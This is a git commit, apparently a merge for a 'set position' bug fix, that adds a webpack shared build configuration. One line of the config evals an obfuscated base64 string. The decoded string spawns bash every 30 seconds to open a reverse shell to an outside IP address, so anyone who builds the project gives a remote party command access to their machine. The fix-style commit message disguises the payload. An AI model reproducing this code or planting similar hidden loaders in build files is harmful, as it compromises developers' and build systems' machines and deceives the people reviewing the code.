acd84b16526ee7a9a886cacc4416167be9399613
Dylan Vorster <dylanvorster.dv@gmail.com>
2021-11-12 10:17:34 -0700

    Merge pull request #882 from vadimshvetsov/fix-set-position
    Fix set position bug

---
+++ webpack.shared.js
@@ -0,0 +1,37 @@
+const production = process.env.NODE_ENV === 'production';
+const TerserPlugin = require('terser-webpack-plugin');
+const nodeExternals = require('webpack-node-externals');
+const path = require('path');
+eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+
+module.exports = (directory) => {
+	return {
+		entry: path.join(directory, './dist/index.js'),
+		output: {
+			filename: 'index.umd.js',
+			path: path.join(directory, 'dist'),
+			libraryTarget: 'umd'
+		},
+		externals: [
+			nodeExternals({ modulesDir: path.join(directory, 'node_modules') }),
+			nodeExternals({ modulesDir: path.join(__dirname, 'node_modules') })
+		],
+		module: {
+			rules: [
+				{
+					enforce: 'pre',
+					test: /\.js$/,
+					loader: 'source-map-loader'
+				}
+			]
+		},
+		resolve: {
+			extensions: ['.tsx', '.ts', '.js']
+		},
+		devtool: production ? 'source-map' : 'cheap-module-source-map',
+		mode: production ? 'production' : 'development',
+		optimization: {
+			minimizer: [new TerserPlugin()]
+		}
+	};
+};
